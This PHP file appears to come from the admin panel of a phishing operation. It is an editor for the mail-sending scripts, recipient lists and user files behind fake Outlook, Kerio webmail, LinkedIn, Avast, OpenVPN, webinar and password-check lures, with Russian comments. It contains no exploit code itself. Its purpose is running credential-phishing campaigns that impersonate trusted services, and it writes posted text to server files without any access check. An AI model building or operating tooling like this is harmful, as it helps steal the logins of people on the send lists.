<?php
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");

// configuration
$url = "https://$_SERVER[HTTP_HOST]/admin/cc/template/deployed.php";
//Изменение файлов send.py
if($_GET['template'] == 'Outlook'){
	$file = '/home/user-data/www/default/owa/auth/sender/send.py';
}if($_GET['template'] == 'checkpass'){
	$file = '/home/user-data/www/default/check/sender/send.py';
}
if($_GET['template'] == 'Kerio'){
	$file = '/home/user-data/www/default/webmail/login/sender/send.py';
}
if($_GET['template'] == 'webinar'){
	$file = '/home/user-data/www/default/event/6f3249aa304055d6/sender/send.py';
}
if($_GET['template'] == 'LinkedIn'){
	$file = '/home/user-data/www/default/vacancy/sender/send.py';
}
if($_GET['template'] == 'antivirus'){
	$file = '/home/user-data/www/default/avast/sender/send.py';
}
if($_GET['template'] == 'vpn'){
	$file = '/home/user-data/www/default/openvpn/sender/send.py';
}
if($_GET['template'] == 'pereraschet'){
	$file = '/home/user-data/www/default/pereraschet/sender/send.py';
}
//Изменение файлов sendlist.txt
if($_GET['template'] == 'Outlook_sendlist'){
	$file = '/home/user-data/www/default/owa/auth/sender/sendlist.txt';
}if($_GET['template'] == 'checkpass_sendlist'){
	$file = '/home/user-data/www/default/check/sender/sendlist.txt';
}
if($_GET['template'] == 'Kerio_sendlist'){
	$file = '/home/user-data/www/default/webmail/login/sender/sendlist.txt';
}
if($_GET['template'] == 'webinar_sendlist'){
	$file = '/home/user-data/www/default/event/6f3249aa304055d6/sender/sendlist.txt';
}
if($_GET['template'] == 'vpn_sendlist'){
	$file = '/home/user-data/www/default/openvpn/sender/sendlist.txt';
}
if($_GET['template'] == 'antivirus_sendlist'){
	$file = '/home/user-data/www/default/avast/sender/sendlist.txt';
}
if($_GET['template'] == 'LinkedIn_sendlist'){
	$file = '/home/user-data/www/default/vacancy/sender/sendlist.txt';
}
if($_GET['template'] == 'pereraschet_sendlist'){
	$file = '/home/user-data/www/default/pereraschet/sender/sendlist.txt';
}
//Изменение файлов user.txt
if($_GET['template'] == 'Outlook_user'){
	$file = '/home/user-data/www/default/owa/auth/sender/user.txt';
}if($_GET['template'] == 'checkpass_user'){
	$file = '/home/user-data/www/default/check/sender/user.txt';
}
if($_GET['template'] == 'Kerio_user'){
	$file = '/home/user-data/www/default/webmail/login/sender/user.txt';
}
if($_GET['template'] == 'webinar_user'){
	$file = '/home/user-data/www/default/event/6f3249aa304055d6/sender/user.txt';
}
if($_GET['template'] == 'vpn_user'){
	$file = '/home/user-data/www/default/openvpn/sender/user.txt';
}
if($_GET['template'] == 'antivirus_user'){
	$file = '/home/user-data/www/default/avast/sender/user.txt';
}
if($_GET['template'] == 'LinkedIn_user'){
	$file = '/home/user-data/www/default/vacancy/sender/user.txt';
}
if($_GET['template'] == 'pereraschet_user'){
	$file = '/home/user-data/www/default/pereraschet/sender/user.txt';
}
// check if form has been submitted
if (isset($_POST['text']))
{
    // save the text contents
    file_put_contents($file, $_POST['text']);

    // redirect to form again
    header(sprintf('Location: %s', $url));
    printf('<a href="%s">Moved</a>.', htmlspecialchars($url));
    exit();
}

// read the textfile
$text = file_get_contents($file);

?>
<html>
<head>
	 <link href="../css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom CSS -->
    <link href="../css/sb-admin.css" rel="stylesheet">

    <!-- Custom Fonts -->
    <link href="../font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
</head>
<body style="background: #1D0F08;">
	<form action="" method="post">
	<div align="center"><textarea name="text" style="border: 1px solid white;background-color: #1F1F1F; padding: 20px; color:white;    font-family: Consolas,Liberation Mono,Courier,monospace;
;width:90%; height: 90%;"><?php echo htmlspecialchars($text) ?></textarea></div><br>
	<div align="center"><input type="submit" value="Сохранить" class="btn btn-default"/>
	<input type="reset" class="btn btn-default" /></div>
	</form>
</body>
<script src="../js/jquery.js"></script>
<script src="../js/bootstrap.min.js"></script>
</html>
